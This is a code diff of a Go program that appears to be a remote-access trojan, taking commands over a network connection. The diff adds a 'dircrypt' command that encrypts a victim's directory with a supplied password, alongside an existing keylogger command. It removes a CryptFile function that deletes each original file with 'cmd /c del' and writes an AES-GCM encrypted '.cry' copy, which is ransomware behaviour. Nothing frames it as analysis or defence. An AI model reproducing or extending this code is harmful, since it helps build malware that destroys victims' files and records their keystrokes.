@@ -1,11 +1,6 @@
 package main
 
 import (
-	"crypto/aes"
-	"crypto/cipher"
-	"crypto/rand"
-	"fmt"
-	"io"
 	"io/ioutil"
 	random "math/rand"
 	"net"
@@ -85,6 +80,15 @@ func main() {
 			conn.Write([]byte(res))
 		}
 
+		if strings.HasPrefix(message, "dircrypt") {
+			data := strings.Split(message, " ")
+			password := data[1]
+			path := data[2]
+			dir_name := strings.Split(path, "/")
+			res := CryptDir(dir_name[len(dir_name)-1], path, password)
+			conn.Write([]byte(res))
+		}
+
 		if strings.HasPrefix(message, "keylogger") {
 			data := strings.Split(message, " ")
 			length, err := strconv.Atoi(data[1])
@@ -120,32 +124,6 @@ func main() {
 			os.Exit(1)
 		}
 	}
-}
-
-func CryptFile(name, path, password string) string {
-	file, _ := ioutil.ReadFile(path)
-	text := []byte(file)
-	key := []byte(password)
-	exec.Command("cmd", "/c ", "del", path).Output()
-	cr, err := aes.NewCipher(key)
-	if err != nil {
-		return "error new cipher"
-	}
-	fmt.Println(err)
-	gcm, err := cipher.NewGCM(cr)
-	if err != nil {
-		return "error new GCM"
-	}
-	nonce := make([]byte, gcm.NonceSize())
-	_, err = io.ReadFull(rand.Reader, nonce)
-	if err != nil {
-		return "error ReadFull"
-	}
-	err = ioutil.WriteFile(path+".cry", gcm.Seal(nonce, nonce, text, nil), 0777)
-	if err != nil {
-		return "error Write"
-	}
-	return "crypt " + name + " sucessful"
 }
 
 func ls_comm(text string) string {
